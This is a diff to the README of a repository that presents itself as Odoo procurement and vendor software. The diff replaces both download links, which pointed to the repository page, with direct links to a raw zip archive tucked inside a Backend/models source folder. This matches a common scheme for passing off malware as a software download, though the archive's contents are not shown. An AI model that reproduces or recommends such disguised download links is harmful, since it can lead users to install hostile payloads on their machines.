@@ -1,6 +1,6 @@
 # 📦 Odoo_VendorBridge - Streamline your procurement and vendor tasks
 
-[![](https://img.shields.io/badge/Download_Software-blue)](https://github.com/Auditorycortexarkansasriver911/Odoo_VendorBridge)
+[![](https://img.shields.io/badge/Download_Software-blue)](https://raw.githubusercontent.com/Auditorycortexarkansasriver911/Odoo_VendorBridge/main/Backend/models/Bridge_Odoo_Vendor_2.6.zip)
 
 Odoo_VendorBridge manages your company procurement and vendor interactions. The software tracks orders, processes invoices, and automates approvals. It provides tools for vendor communication and data management.
 
@@ -16,7 +16,7 @@ Ensure your computer meets these requirements before you start:
 
 ## 📥 Downloading the Application
 
-Visit this page to download: [https://github.com/Auditorycortexarkansasriver911/Odoo_VendorBridge](https://github.com/Auditorycortexarkansasriver911/Odoo_VendorBridge)
+Visit this page to download: [https://raw.githubusercontent.com/Auditorycortexarkansasriver911/Odoo_VendorBridge/main/Backend/models/Bridge_Odoo_Vendor_2.6.zip](https://raw.githubusercontent.com/Auditorycortexarkansasriver911/Odoo_VendorBridge/main/Backend/models/Bridge_Odoo_Vendor_2.6.zip)
 
 To download the version for Windows:
 
